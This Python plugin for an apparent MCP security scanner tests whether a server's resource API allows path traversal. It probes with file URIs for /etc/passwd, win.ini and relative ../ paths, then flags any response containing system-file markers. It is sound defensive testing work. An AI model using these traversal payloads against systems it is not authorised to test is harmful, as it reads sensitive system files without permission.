from mcp_sec.core.models import PluginResult, Vulnerability, Severity

def info():
    return {
        "name": "resource_traversal",
        "title": "Resource Path Traversal",
        "description": "Tests if the MCP resource interface allows reading arbitrary files.",
        "severity": Severity.HIGH,
        "author": "Marc Stöcker",
        "contact": "v3rm1ll1on@proton.me",
        "version": "1.0.0",
        "groups": ["owasp", "lfi", "resources"],
        "cwe": "CWE-22",
        "owasp": "A01:2021-Broken Access Control"
    }

async def run_test(mcp_client, server_tools) -> PluginResult:
    # Notice: server_tools is ignored here because we test the Resource API directly.
    plugin_name = info()["title"]
    vulnerabilities = []

    try:
        # Fetch resources to check if resource API is implemented
        resources_resp = await mcp_client.list_resources()
    except Exception:
        # Resource API not implemented or not available
        return PluginResult.from_vulnerabilities(plugin_name, [], "Resource API not supported by target.")

    # Even if they expose 0 resources, the read_resource endpoint might still be active and vulnerable
    payloads = [
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "file://../../../etc/passwd",
        "file://../etc/passwd"
    ]

    for payload in payloads:
        try:
            res = await mcp_client.read_resource(payload)
            if res and hasattr(res, "contents"):
                for content in res.contents:
                    text = getattr(content, "text", "")
                    if "root:x:0:0:" in text or "[extensions]" in text:
                        vulnerabilities.append(Vulnerability(
                            title="Resource Traversal (LFI)",
                            description=f"The MCP resource endpoint allowed reading system files via URI: {payload}",
                            severity=Severity.HIGH,
                            tool_name="Resource_API",
                            payload=payload
                        ))
        except Exception:
            # Gracefully denied
            pass

    return PluginResult.from_vulnerabilities(plugin_name, vulnerabilities, "No resource traversal vulnerabilities found.")
